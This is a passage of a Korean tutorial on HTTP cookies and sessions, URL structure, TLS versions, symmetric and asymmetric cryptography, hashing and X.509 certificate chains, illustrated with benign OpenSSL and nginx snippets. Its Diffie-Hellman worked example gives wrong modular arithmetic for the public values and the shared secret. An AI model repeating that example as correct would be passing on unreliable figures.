Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

---

## 🍪 쿠키(Cookie)와 세션(Session)

### HTTP의 Stateless 특성 문제

**HTTP는 Stateless (무상태)**:
```
요청1: "로그인해줘" → 서버: "OK, 로그인됨"
요청2: "내 정보 보여줘" → 서버: "누구세요?" ❌
```

**문제점**:
- 서버는 이전 요청을 기억하지 못함
- 매번 인증 정보를 보내야 함

**해결책**: **쿠키(Cookie)**

---

### 쿠키 동작 방식

```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 서버

    Client->>Server: POST /login<br/>{username: "admin", password: "1234"}
    Note over Server: 인증 성공!<br/>세션 ID 생성: "abc123xyz"
    Server->>Client: HTTP/1.1 200 OK<br/>Set-Cookie: session_id=abc123xyz

    Note over Client: 브라우저가 쿠키 저장

    Client->>Server: GET /mypage<br/>Cookie: session_id=abc123xyz
    Note over Server: 세션 ID 확인<br/>"abc123xyz"는 admin 사용자
    Server->>Client: HTTP/1.1 200 OK<br/>{name: "admin", ...}
```

---

### 쿠키 설정 예제

**서버 응답 (Set-Cookie)**:
```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure; Max-Age=3600; SameSite=Strict
Set-Cookie: user_pref=dark_mode; Path=/; Max-Age=31536000

{
  "message": "Login successful"
}
```

**쿠키 속성 설명**:

| 속성 | 의미 | 예제 |
|:---:|:---:|:---:|
| **Path** | 쿠키 유효 경로 | `Path=/` (모든 경로) |
| **Domain** | 쿠키 유효 도메인 | `Domain=.example.com` (서브도메인 포함) |
| **Max-Age** | 쿠키 유효 시간 (초) | `Max-Age=3600` (1시간) |
| **Expires** | 쿠키 만료 일시 | `Expires=Wed, 01 Jan 2025 00:00:00 GMT` |
| **HttpOnly** | JavaScript 접근 차단 | `HttpOnly` (XSS 방지) |
| **Secure** | HTTPS에서만 전송 | `Secure` (도청 방지) |
| **SameSite** | CSRF 방지 | `SameSite=Strict` (다른 사이트에서 전송 금지) |

**SameSite 옵션**:
- `Strict`: 같은 사이트에서만 전송
- `Lax`: 일부 경우 허용 (GET, 링크 클릭 등)
- `None`: 모든 경우 허용 (단, Secure 필수)

---

### 클라이언트 요청 (Cookie)

**쿠키 전송**:
```http
GET /api/mypage HTTP/1.1
Host: www.example.com
Cookie: session_id=abc123xyz; user_pref=dark_mode
```

**JavaScript에서 쿠키 접근**:
```javascript
// 쿠키 읽기
console.log(document.cookie);
// "user_pref=dark_mode"

// 쿠키 설정
document.cookie = "theme=light; Max-Age=3600; Path=/";

// 쿠키 삭제
document.cookie = "theme=; Max-Age=0; Path=/";
```

**주의**: `HttpOnly` 쿠키는 JavaScript로 접근 불가

---

### 세션 vs 쿠키

| 구분 | 세션 (Session) | 쿠키 (Cookie) |
|:---:|:---:|:---:|
| **저장 위치** | 서버 | 클라이언트 (브라우저) |
| **보안** | 높음 | 낮음 (노출 가능) |
| **용량** | 제한 없음 | 4KB 제한 |
| **속도** | 느림 (서버 조회 필요) | 빠름 (로컬 저장) |
| **용도** | 인증, 중요 정보 | 설정, 비중요 정보 |

**일반적인 구현**:
```
1. 로그인 성공 → 서버에서 세션 생성
2. 세션 ID를 쿠키로 클라이언트에 전달
3. 이후 요청 시 세션 ID 쿠키 전송
4. 서버는 세션 ID로 세션 조회
```

---

## 🌐 URI vs URL vs URN

### 개념 정리

**URI (Uniform Resource Identifier)**:
- 리소스를 **식별**하는 통일된 방법
- URL과 URN을 포함하는 상위 개념

**URL (Uniform Resource Locator)**:
- 리소스의 **위치**를 나타냄
- 프로토콜, 호스트, 경로 포함

**URN (Uniform Resource Name)**:
- 리소스의 **이름**을 나타냄
- 위치와 무관하게 고유한 이름

**관계**:
```
URI
├── URL (위치 기반)
└── URN (이름 기반)
```

---

### URL 구조

**전체 구조**:
```
https://user:pass@www.example.com:443/path/to/resource?key=value&foo=bar#section
  ①     ②    ③        ④            ⑤        ⑥              ⑦              ⑧
```

**구성 요소**:

① **Scheme (Protocol)**:
- `https://`
- 프로토콜 지정 (http, https, ftp, mailto 등)

② **User Info** (선택):
- `user:pass@`
- 인증 정보 (보안상 거의 사용 안 함)

③ **Password** (선택):
- 비밀번호

④ **Host**:
- `www.example.com`
- 도메인 이름 또는 IP 주소

⑤ **Port** (선택):
- `:443`
- 포트 번호 (생략 시 기본값: http=80, https=443)

⑥ **Path**:
- `/path/to/resource`
- 리소스 경로

⑦ **Query String**:
- `?key=value&foo=bar`
- 파라미터 전달 (`&`로 구분)

⑧ **Fragment**:
- `#section`
- 페이지 내 특정 위치 (서버로 전송 안 됨)

---

### URL 인코딩

**문제**:
```
https://example.com/search?q=안녕하세요&page=1
```
→ URL에 한글, 특수문자 사용 불가

**해결**: **Percent Encoding**
```
https://example.com/search?q=%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94&page=1
```

**인코딩 규칙**:
- 예약 문자: `!`, `*`, `'`, `(`, `)`, `;`, `:`, `@`, `&`, `=`, `+`, `$`, `,`, `/`, `?`, `#`, `[`, `]`
- 비 ASCII 문자: 한글, 중국어 등
- 공백: `%20` 또는 `+`

**JavaScript 예제**:
```javascript
// 인코딩
encodeURIComponent("안녕하세요");
// "%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94"

// 디코딩
decodeURIComponent("%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94");
// "안녕하세요"
```

---

## ✅ 학습 체크리스트

- [ ] HTTP의 역사와 각 버전의 특징을 설명할 수 있다
- [ ] HTTP/1.1의 Keep-Alive가 왜 필요한지 이해한다
- [ ] HTTP/2의 멀티플렉싱 개념을 설명할 수 있다
- [ ] HTTP/3가 UDP를 사용하는 이유를 알고 있다
- [ ] QUIC의 0-RTT, 연결 마이그레이션을 이해한다
- [ ] HTTP 메시지 구조(Request/Response)를 설명할 수 있다
- [ ] 주요 HTTP 상태 코드를 구분할 수 있다
- [ ] GET, POST, PUT, PATCH, DELETE의 차이를 이해한다
- [ ] 쿠키와 세션의 차이를 설명할 수 있다
- [ ] URI, URL, URN의 차이를 알고 있다

---

## 📋 핵심 요약

### HTTP 버전 비교

| 특징 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|:---:|:---:|:---:|:---:|
| **전송 계층** | TCP | TCP | UDP (QUIC) |
| **연결** | Keep-Alive | Multiplexing | QUIC 연결 |
| **HOL Blocking** | 있음 | 스트림 레벨만 | 없음 |
| **헤더 압축** | 없음 | HPACK | QPACK |
| **연결 수립** | 3 RTT | 3 RTT | 0~1 RTT |
| **암호화** | 선택 | 선택 (권장) | 필수 |

### 주요 상태 코드

- **200 OK**: 성공
- **201 Created**: 생성 성공
- **301 Moved Permanently**: 영구 이동
- **400 Bad Request**: 잘못된 요청
- **401 Unauthorized**: 인증 필요
- **403 Forbidden**: 권한 없음
- **404 Not Found**: 리소스 없음
- **500 Internal Server Error**: 서버 오류
- **503 Service Unavailable**: 서비스 중단

---

## 🔐 보안 고려사항

### HTTPS 사용 필수

**HTTP의 문제**:
- 평문 전송 → **도청 가능**
- 무결성 검증 없음 → **변조 가능**
- 인증 없음 → **중간자 공격 가능**

**HTTPS (HTTP + TLS)**:
- **암호화**: 데이터 보호
- **무결성**: 변조 방지
- **인증**: 서버 신원 확인

### 쿠키 보안

**필수 설정**:
```http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
```

**이유**:
- `HttpOnly`: XSS 공격 방지
- `Secure`: HTTPS에서만 전송 (도청 방지)
- `SameSite=Strict`: CSRF 공격 방지

---

다음 섹션에서는 **SSL/TLS와 암호화 기술**을 학습합니다.
# Section 4: SSL/TLS & 암호화 기술

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- SSL/TLS의 역사와 버전별 진화 과정
- 암호화가 필요한 이유와 위협 모델
- 대칭키 암호화 (AES, 3DES) 완벽 이해
- 비대칭키 암호화 (RSA, DH, ECDH) 원리
- 해시 함수와 MAC(Message Authentication Code)
- 디지털 인증서와 PKI(Public Key Infrastructure)
- CA(Certificate Authority)의 역할
- TLS Handshake 프로세스 (1.2 vs 1.3)
- 인증서 검증 과정
- SSL/TLS Offloading 개념
- Wireshark를 이용한 TLS 트래픽 분석 실습
- 보안 모범 사례 및 최신 트렌드

---

## 📚 SSL/TLS란 무엇인가?

### 정의

**SSL (Secure Sockets Layer)**:
- Netscape社가 1995년 개발한 **보안 프로토콜**
- 웹 통신 보안을 위해 설계

**TLS (Transport Layer Security)**:
- SSL의 후속 표준 (IETF에서 표준화)
- 1999년부터 TLS라는 명칭 사용
- 현재는 **TLS**가 공식 명칭

**위치**:
```mermaid
graph TB
    A[애플리케이션 계층<br/>HTTP, FTP, SMTP] --> B[프레젠테이션 계층<br/>SSL/TLS]
    B --> C[전송 계층<br/>TCP, UDP]
    C --> D[네트워크 계층<br/>IP]
    D --> E[데이터링크 계층<br/>Ethernet]
```

**역할**:
1. **암호화 (Encryption)**: 데이터를 읽을 수 없게 변환
2. **무결성 (Integrity)**: 데이터 변조 방지
3. **인증 (Authentication)**: 통신 상대 신원 확인

---

## 📅 SSL/TLS 역사

### 버전별 진화

| 연도 | 버전 | 주요 특징 | 상태 |
|:---:|:---:|:---:|:---:|
| **1994** | SSL 1.0 | 내부 테스트만, 공개 안 됨 | ❌ 사용 금지 |
| **1995** | SSL 2.0 | 최초 공개, 즉시 취약점 발견 | ❌ 사용 금지 |
| **1996** | SSL 3.0 | 보안 개선 | ❌ 사용 금지 (2015년) |
| **1999** | TLS 1.0 | SSL 3.0 기반, 표준화 | ❌ 사용 금지 (2020년) |
| **2006** | TLS 1.1 | CBC 공격 방어 개선 | ❌ 사용 금지 (2020년) |
| **2008** | TLS 1.2 | 강력한 암호화 알고리즘 지원 | ✅ 현재 주력 버전 |
| **2018** | TLS 1.3 | Handshake 단축, 보안 강화 | ✅ 최신 권장 버전 |

---

### SSL 1.0

**상태**: 공개되지 않음
- 개발 단계에서 **심각한 보안 결함** 발견
- 출시 전에 폐기

---

### SSL 2.0 (1995년)

**문제점**:
- 출시 **당일** 보안 취약점 발견
- 중간자 공격(MITM) 가능
- 약한 암호화 알고리즘

**결과**: 즉시 사용 중단

---

### SSL 3.0 (1996년)

**개선사항**:
- SSL 2.0의 대부분 취약점 패치
- 더 강력한 암호화 지원

**치명적 취약점**:
- **POODLE 공격** (2014년 발견)
- Padding Oracle 공격으로 데이터 복호화 가능

**결과**: 2015년 공식 사용 금지 (RFC 7568)

---

### TLS 1.0 (1999년)

**변화**:
- SSL에서 **TLS**로 명칭 변경
- IETF에서 표준화
- SSL 3.0과 **거의 동일** (약간의 개선)

**문제점**:
- SSL 3.0과 호환성 유지 → 취약점 상속
- BEAST, CRIME 등 공격에 취약

**결과**: 2020년 주요 브라우저에서 지원 중단

---

### TLS 1.1 (2006년)

**개선사항**:
- CBC 모드 공격 방어 개선
- BEAST 공격 완화

**문제점**:
- 여전히 낮은 보안 수준
- TLS 1.2와 큰 차이 없어 널리 채택 안 됨

**결과**: 2020년 주요 브라우저에서 지원 중단

---

### TLS 1.2 (2008년) - 현재 주력 버전

**핵심 개선사항**:
1. **강력한 암호화 알고리즘**:
   - AES-GCM (Galois/Counter Mode)
   - SHA-256, SHA-384 해시 함수
   - ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) 키 교환

2. **알고리즘 협상 개선**:
   - 클라이언트와 서버가 암호화 스위트 협상

3. **확장성**:
   - SNI (Server Name Indication) 지원
   - ALPN (Application-Layer Protocol Negotiation)

**사용 현황**:
- **2020년대 초반까지 가장 널리 사용**
- 현재도 많은 시스템에서 사용 중
- 안정성과 호환성 우수

**권장 설정**:
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
ssl_prefer_server_ciphers on;
```

---

### TLS 1.3 (2018년) - 최신 권장 버전

**혁신적 개선사항**:

#### 1. Handshake 단축 (1-RTT)

**TLS 1.2**:
```mermaid
sequenceDiagram
    participant Client
    participant Server

    Note over Client,Server: TCP 3-Way Handshake (1 RTT)
    Client->>Server: SYN
    Server->>Client: SYN+ACK
    Client->>Server: ACK

    Note over Client,Server: TLS 1.2 Handshake (2 RTT)
    Client->>Server: ClientHello
    Server->>Client: ServerHello, Certificate, ServerKeyExchange, ServerHelloDone
    Client->>Server: ClientKeyExchange, ChangeCipherSpec, Finished
    Server->>Client: ChangeCipherSpec, Finished

    Note over Client,Server: Application Data
    Client->>Server: HTTP Request
    Server->>Client: HTTP Response
```
→ **총 3 RTT** (TCP 1 + TLS 2)

**TLS 1.3**:
```mermaid
sequenceDiagram
    participant Client
    participant Server

    Note over Client,Server: TCP 3-Way Handshake (1 RTT)
    Client->>Server: SYN
    Server->>Client: SYN+ACK
    Client->>Server: ACK

    Note over Client,Server: TLS 1.3 Handshake (1 RTT!)
    Client->>Server: ClientHello + KeyShare
    Server->>Client: ServerHello + KeyShare, Certificate, Finished

    Note over Client,Server: Application Data (즉시!)
    Client->>Server: HTTP Request
    Server->>Client: HTTP Response
```
→ **총 2 RTT** (TCP 1 + TLS 1)

**0-RTT (재연결 시)**:
```
클라이언트: ClientHello + 이전 세션 티켓 + HTTP Request (동시 전송!)
서버: 즉시 HTTP Response
```
→ **총 1 RTT** (TCP만 필요)

**성능 향상**:
- 초기 연결: **30~50% 빠름**
- 재연결: **70~80% 빠름**

#### 2. 보안 강화

**취약한 암호화 제거**:
- ❌ RSA 키 교환 (정적 키)
- ❌ CBC 모드 (BEAST, POODLE 공격)
- ❌ RC4, 3DES
- ❌ MD5, SHA-1

**강제 사용**:
- ✅ **Perfect Forward Secrecy (PFS)** 필수
- ✅ ECDHE, DHE 키 교환만 허용
- ✅ AEAD 암호화 (AES-GCM, ChaCha20-Poly1305)
- ✅ SHA-256 이상 해시

#### 3. 암호화 범위 확대

**TLS 1.2**:
```
ClientHello (평문)
ServerHello (평문)
Certificate (평문)
...
ChangeCipherSpec ← 여기서부터 암호화
Application Data (암호화)
```

**TLS 1.3**:
```
ClientHello (평문)
ServerHello (평문)
Certificate (암호화!) ← 인증서부터 암호화
Finished (암호화)
Application Data (암호화)
```

**장점**:
- **인증서 내용 보호** (도메인 숨김)
- **메타데이터 최소화**

---

## 🔐 암호화 기술

### 암호화가 필요한 이유

**위협 시나리오**:

#### 1. 도청 (Eavesdropping)
```
클라이언트 ━━━━━━━> "아이디: admin, 비밀번호: 1234" ━━━━━━━> 서버
                      ↓
                  공격자 (스니핑)
                  "아하! 관리자 계정이군!"
```

#### 2. 변조 (Tampering)
```
클라이언트 ━━━> "계좌이체: 1,000원" ━━━> 공격자 (변조) ━━━> "계좌이체: 1,000,000원" ━━━> 서버
```

#### 3. 위장 (Spoofing)
```
클라이언트 ━━━> "www.bank.com 접속" ━━━> 공격자 (가짜 서버)
                                        "환영합니다! 계좌번호 입력하세요"
```

**해결책**:
- 도청 방지 → **암호화**
- 변조 방지 → **무결성 검증 (해시)**
- 위장 방지 → **인증 (인증서)**

---

## 🔑 대칭키 암호화 (Symmetric Encryption)

### 개념

**정의**:
- **암호화와 복호화에 동일한 키 사용**
- 공통키 암호화라고도 함

**동작 방식**:
```mermaid
graph LR
    A[평문<br/>Hello World] -->|암호화<br/>Key: abc123| B[암호문<br/>4f9a2e...]
    B -->|복호화<br/>Key: abc123| C[평문<br/>Hello World]
```

**특징**:
- ✅ **속도 빠름** (RSA 대비 100~1000배)
- ✅ **효율적** (대용량 데이터 처리)
- ❌ **키 배포 문제** (안전하게 키를 전달하기 어려움)

---

### 주요 알고리즘

#### AES (Advanced Encryption Standard)

**정보**:
- **2001년 미국 NIST 표준 채택**
- 현재 가장 널리 사용되는 대칭키 암호화
- 벨기에 암호학자들이 개발 (Rijndael 알고리즘 기반)

**키 길이**:
- **AES-128**: 128비트 키 (가장 일반적)
- **AES-192**: 192비트 키
- **AES-256**: 256비트 키 (최고 보안)

**속도**:
- 하드웨어 가속 지원 (AES-NI)
- 초당 수 GB 처리 가능

**사용 예**:
```bash
# OpenSSL로 AES-256-CBC 암호화
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k mypassword

# 복호화
openssl enc -d -aes-256-cbc -in encrypted.bin -out decrypted.txt -k mypassword
```

**암호화 모드**:
- **ECB** (Electronic Codebook): 간단하지만 보안 취약 ❌
- **CBC** (Cipher Block Chaining): 블록 체인 방식 ✅
- **CTR** (Counter): 병렬 처리 가능 ✅
- **GCM** (Galois/Counter Mode): 무결성 검증 포함 ✅✅ (TLS 1.2 이상 권장)

#### 3DES (Triple Data Encryption Standard)

**정보**:
- DES를 **3번 반복** 적용
- 1970년대 개발된 DES의 개선 버전

**문제점**:
- AES보다 **속도 느림** (3배 느림)
- 키 길이 168비트 (실질적으로 112비트 보안)
- **현재 사용 권장하지 않음** (2023년 NIST 폐기)

**사용 예**:
```bash
# OpenSSL로 3DES 암호화 (권장하지 않음)
openssl enc -des3 -salt -in plaintext.txt -out encrypted.bin -k mypassword
```

#### ARIA

**정보**:
- **한국 국가 표준** (2004년)
- AES와 유사한 구조
- 128/192/256비트 키 지원

**사용**:
- 한국 정부 및 금융권에서 사용
- 국제 표준 (ISO/IEC 18033-3)

---

## 🔓 비대칭키 암호화 (Asymmetric Encryption)

### 개념

**정의**:
- **암호화와 복호화에 서로 다른 키 사용**
- 공개키 암호화라고도 함

**키 쌍**:
- **공개키 (Public Key)**: 누구에게나 공개 가능
- **개인키 (Private Key)**: 본인만 소유

**동작 방식**:

#### 1. 암호화 용도
```mermaid
graph LR
    A[평문] -->|암호화<br/>공개키| B[암호문]
    B -->|복호화<br/>개인키| C[평문]
```

**시나리오**:
```
1. Bob이 공개키/개인키 쌍 생성
2. Bob이 공개키를 Alice에게 전달
3. Alice: "Hello Bob"을 Bob의 공개키로 암호화
4. Alice가 암호문을 Bob에게 전송
5. Bob: 자신의 개인키로 복호화 → "Hello Bob"
```

**장점**:
- 공개키는 **안전하지 않은 채널**로 전달 가능
- 개인키는 절대 전송 안 함

#### 2. 전자서명 용도
```mermaid
graph LR
    A[메시지] -->|서명<br/>개인키| B[서명]
    B -->|검증<br/>공개키| C[유효성 확인]
```

**시나리오**:
```
1. Alice가 메시지를 해시: "계약서" → hash123
2. Alice가 hash123을 자신의 개인키로 암호화 (서명)
3. Alice가 "계약서 + 서명"을 Bob에게 전송
4. Bob: 계약서를 해시 → hash123
5. Bob: 서명을 Alice의 공개키로 복호화 → hash123
6. 두 해시가 같으면 → ✅ Alice가 서명한 것 맞음
```

**특징**:
- ✅ **키 배포 문제 해결**
- ✅ **전자서명 가능**
- ❌ **속도 느림** (대칭키보다 100~1000배 느림)
- ❌ **대용량 데이터 부적합**

---

### 주요 알고리즘

#### RSA (Rivest-Shamir-Adleman)

**정보**:
- **1977년 개발** (3명의 암호학자 이름)
- 가장 널리 사용되는 비대칭키 암호화
- 큰 소수의 곱셈 어려움 이용

**키 길이**:
- **1024비트**: 현재 **보안 취약** ❌
- **2048비트**: 일반적 사용 ✅
- **3072비트**: 고급 보안
- **4096비트**: 최고 보안

**사용 예**:

**키 쌍 생성**:
```bash
# 2048비트 RSA 키 쌍 생성
openssl genrsa -out private_key.pem 2048

# 공개키 추출
openssl rsa -in private_key.pem -pubout -out public_key.pem
```

**암호화/복호화**:
```bash
# 공개키로 암호화
openssl rsautl -encrypt -inkey public_key.pem -pubin -in plaintext.txt -out encrypted.bin

# 개인키로 복호화
openssl rsautl -decrypt -inkey private_key.pem -in encrypted.bin -out decrypted.txt
```

**서명/검증**:
```bash
# 개인키로 서명
openssl dgst -sha256 -sign private_key.pem -out signature.bin message.txt

# 공개키로 검증
openssl dgst -sha256 -verify public_key.pem -signature signature.bin message.txt
```

**문제점**:
- **속도 느림**: 대용량 데이터 암호화 부적합
- **키 크기 큼**: 2048비트 이상 필요

#### Diffie-Hellman (DH)

**정보**:
- **1976년 최초 공개키 암호화 방식**
- **키 교환 전용** (암호화 불가)
- 이산 로그 문제 이용

**목적**:
- 두 당사자가 **안전하지 않은 채널**에서 **공통 비밀키** 생성

**동작 방식**:
```
공개 파라미터: p (소수), g (생성자)

Alice:
  1. 개인값 선택: a (예: 15)
  2. 공개값 계산: A = g^a mod p = 7^15 mod 23 = 6
  3. Bob에게 A 전송

Bob:
  1. 개인값 선택: b (예: 13)
  2. 공개값 계산: B = g^b mod p = 7^13 mod 23 = 2
  3. Alice에게 B 전송

Alice:
  공통 비밀키 계산: s = B^a mod p = 2^15 mod 23 = 9

Bob:
  공통 비밀키 계산: s = A^b mod p = 6^13 mod 23 = 9

✅ 둘 다 동일한 비밀키 (9) 획득!
공격자는 p, g, A, B를 알아도 s를 계산하기 어려움
```

**문제점**:
- **중간자 공격(MITM)에 취약**: 인증 기능 없음
- 해결: **DHE (Ephemeral)** 사용 + 인증서 결합

#### ECDH (Elliptic Curve Diffie-Hellman)

**정보**:
- **타원 곡선 암호화** 기반
- DH보다 **짧은 키**로 **동일한 보안 수준**

**키 길이 비교**:

| RSA/DH | ECDH | 보안 수준 |
|:---:|:---:|:---:|
| 1024비트 | 160비트 | 낮음 |
| 2048비트 | 224비트 | 일반 |
| 3072비트 | 256비트 | 높음 |
| 7680비트 | 384비트 | 매우 높음 |

**장점**:
- ✅ **키 크기 작음** (256비트로 3072비트 RSA와 동등)
- ✅ **속도 빠름**
- ✅ **모바일 친화적** (낮은 CPU 사용)

**사용**:
- TLS 1.3 권장 키 교환 방식
- Bitcoin, Ethereum 등 블록체인
- 대부분의 최신 시스템

**곡선 종류**:
- **P-256** (secp256r1): NIST 표준
- **P-384** (secp384r1): 고급 보안
- **Curve25519**: 빠르고 안전 (TLS 1.3 선호)

---

## 🔨 해시 함수 (Hash Function)

### 개념

**정의**:
- 임의 길이의 데이터를 **고정 길이의 값**으로 변환
- **일방향 함수** (복호화 불가)

**특징**:
1. **결정적**: 동일 입력 → 동일 출력
2. **빠른 계산**: 입력에서 해시값 빠르게 계산
3. **일방향**: 해시값에서 원본 복구 불가능
4. **충돌 저항성**: 동일한 해시값을 가진 두 입력 찾기 어려움
5. **눈사태 효과**: 입력 1비트 변경 → 출력 절반 이상 변경

**동작**:
```
입력: "Hello World"
      ↓ [해시 함수]
출력: a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e

입력: "Hello World!" (느낌표 추가)
      ↓ [해시 함수]
출력: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
```
→ 완전히 다른 해시값

---

### 주요 해시 알고리즘

#### MD5 (Message Digest 5)

**정보**:
- **1991년 개발**
- 128비트 (32자리 16진수) 출력

**문제점**:
- **충돌 발견됨** (2004년)
- 공격자가 동일 해시값을 가진 다른 파일 생성 가능
- **보안 용도 사용 금지** ❌

**현재 사용**:
- 파일 무결성 검증 (보안 요구 없는 경우)
- 체크섬

**예제**:
```bash
echo -n "Hello World" | md5sum
# b10a8db164e0754105b7a99be72e3fe5
```

#### SHA-1 (Secure Hash Algorithm 1)

**정보**:
- **1995년 NSA 개발**
- 160비트 (40자리 16진수) 출력

**문제점**:
- **2017년 충돌 발견** (Google)
- **보안 용도 사용 금지** ❌

**예제**:
```bash
echo -n "Hello World" | sha1sum
# 0a4d55a8d778e5022fab701977c5d840bbc486d0
```

#### SHA-256 (SHA-2 패밀리)

**정보**:
- **2001년 NSA 개발**
- 256비트 (64자리 16진수) 출력
- **현재 표준**

**SHA-2 패밀리**:
- SHA-224, SHA-256, SHA-384, SHA-512

**사용**:
- TLS 인증서
- Bitcoin 채굴
- 파일 무결성 검증

**예제**:
```bash
echo -n "Hello World" | sha256sum
# a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e
```

#### SHA-3

**정보**:
- **2015년 표준화**
- SHA-2와 완전히 다른 구조 (Keccak 알고리즘)
- 224, 256, 384, 512비트 출력

**사용**:
- 미래 대비 (SHA-2 대체용)
- 일부 블록체인

---

### MAC (Message Authentication Code)

**개념**:
- **해시 + 비밀키** 조합
- 메시지 무결성 + 인증 제공

**종류**:

#### HMAC (Hash-based MAC)
```
HMAC(key, message) = H((key ⊕ opad) || H((key ⊕ ipad) || message))
```

**사용 예**:
```bash
# OpenSSL로 HMAC-SHA256 계산
echo -n "Hello World" | openssl dgst -sha256 -hmac "secret_key"
# HMAC-SHA256(stdin)= 5d5d9f1c9e7e3a1b...
```

**용도**:
- API 인증 (JWT, OAuth)
- 쿠키 무결성 검증
- TLS Record Protocol

---

## 📜 디지털 인증서 (Digital Certificate)

### 개념

**문제 상황**:
```
Alice: "Bob, 여기 내 공개키야"
Bob: "정말 Alice의 공개키인가? 공격자가 가짜를 보낸 건 아닐까?"
```

**해결책**: **신뢰할 수 있는 제3자(CA)가 보증**

**디지털 인증서**:
- **신원과 공개키를 결합**한 전자 문서
- **CA(Certificate Authority)**가 디지털 서명

---

### X.509 인증서 구조

**표준**: ITU-T X.509

**주요 필드**:

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 04:00:00:00:00:01:15:4b:5a:c3:94
        Signature Algorithm: sha256WithRSAEncryption

        Issuer: C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA

        Validity
            Not Before: Jan  1 00:00:00 2024 GMT
            Not After : Dec 31 23:59:59 2025 GMT

        Subject: C=KR, ST=Seoul, L=Seoul, O=Example Corp, CN=www.example.com

        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus: 00:c9:0f:a2:...
                Exponent: 65537 (0x10001)

        X509v3 extensions:
            X509v3 Subject Alternative Name:
                DNS:www.example.com, DNS:example.com
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage:
                TLS Web Server Authentication

    Signature Algorithm: sha256WithRSAEncryption
         a1:2b:3c:4d:...
```

**필드 설명**:

**Serial Number**:
- 인증서 고유 번호
- CA가 발급한 모든 인증서 중 유일

**Issuer**:
- 발급자 (CA) 정보
- 예: DigiCert, Let's Encrypt

**Validity**:
- 유효 기간
- 만료 전 갱신 필요

**Subject**:
- 소유자 (서버) 정보
- CN (Common Name): 도메인 이름

**Subject Public Key Info**:
- 서버의 공개키

**Subject Alternative Name (SAN)**:
- 추가 도메인 이름
- 와일드카드 지원: `*.example.com`

**Key Usage**:
- 인증서 용도 제한
- 디지털 서명, 키 암호화 등

**Signature**:
- CA의 디지털 서명
- 인증서 무결성 보장

---

### CA (Certificate Authority) 계층 구조

**PKI (Public Key Infrastructure)**:

```mermaid
graph TB
    A[Root CA<br/>최상위 인증 기관<br/>예: DigiCert Global Root CA] --> B[Intermediate CA 1<br/>중간 인증 기관<br/>DigiCert SHA2 Secure Server CA]
    A --> C[Intermediate CA 2<br/>Let's Encrypt Authority X3]

    B --> D[End-Entity Certificate<br/>www.example.com]
    B --> E[End-Entity Certificate<br/>www.test.com]

    C --> F[End-Entity Certificate<br/>www.mysite.com]
```

**Root CA (루트 인증 기관)**:
- **최상위 신뢰 기관**
- 자체 서명 (Self-Signed)
- OS/브라우저에 **사전 설치**됨

**주요 Root CA**:
- DigiCert
- Let's Encrypt
- GlobalSign
- Comodo (Sectigo)
- GeoTrust

**Intermediate CA (중간 인증 기관)**:
- Root CA가 서명
- 실제 서버 인증서 발급
- Root CA 키 보호 (오프라인 보관)

**End-Entity Certificate (서버 인증서)**:
- 웹 서버에 설치
- Intermediate CA가 서명

---

### 인증서 신뢰 체인 (Certificate Chain)

**검증 과정**:

```
1. 브라우저: "www.example.com 접속"
2. 서버: [서버 인증서 + 중간 인증서] 전송
3. 브라우저:
   a. 서버 인증서를 중간 CA 공개키로 검증 ✅
   b. 중간 인증서를 Root CA 공개키로 검증 ✅
   c. Root CA는 브라우저에 사전 설치됨 ✅
4. 브라우저: "신뢰할 수 있는 사이트!"
```

**체인 예제**:
```
[서버 인증서: www.example.com]
    서명자: DigiCert SHA2 Secure Server CA
            ↓
[중간 인증서: DigiCert SHA2 Secure Server CA]
    서명자: DigiCert Global Root CA
            ↓
[Root 인증서: DigiCert Global Root CA] ← 브라우저에 사전 설치
```

**OpenSSL로 체인 확인**:
```bash
# 인증서 체인 다운로드
openssl s_client -connect www.example.com:443 -showcerts > chain.pem

# 인증서 정보 확인
openssl x509 -in chain.pem -text -noout

# 체인 검증
openssl verify -CAfile ca-bundle.crt www.example.com.crt
```

---

### 인증서 획득 과정

**1. CSR (Certificate Signing Request) 생성**:
```bash
# 개인키 생성
openssl genrsa -out server.key 2048

# CSR 생성
openssl req -new -key server.key -out server.csr
```

**CSR에 포함된 정보**:
```
Country Name (2 letter code): KR
State or Province Name: Seoul
Locality Name: Seoul
Organization Name: Example Corp
Organizational Unit Name: IT Department
Common Name: www.example.com
Email Address: admin@example.com
```

**2. CA에 CSR 제출**:
- 유료 CA: DigiCert, GlobalSign 등 (연간 수만~수십만 원)
- 무료 CA: Let's Encrypt (자동화)

**3. CA 검증**:
- **DV (Domain Validation)**: 도메인 소유 확인 (이메일, DNS, HTTP)
- **OV (Organization Validation)**: 조직 실재 확인
- **EV (Extended Validation)**: 엄격한 조직 검증 (녹색 주소창)

**4. 인증서 발급**:
- CA가 서명한 인증서 전달
- `.crt`, `.pem`, `.cer` 파일

**5. 서버에 설치**:

**Nginx 예제**:
```nginx
server {
    listen 443 ssl http2;
    server_name www.example.com;

    ssl_certificate /etc/nginx/ssl/server.crt;
    ssl_certificate_key /etc/nginx/ssl/server.key;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
}
```

**Apache 예제**:
```apache
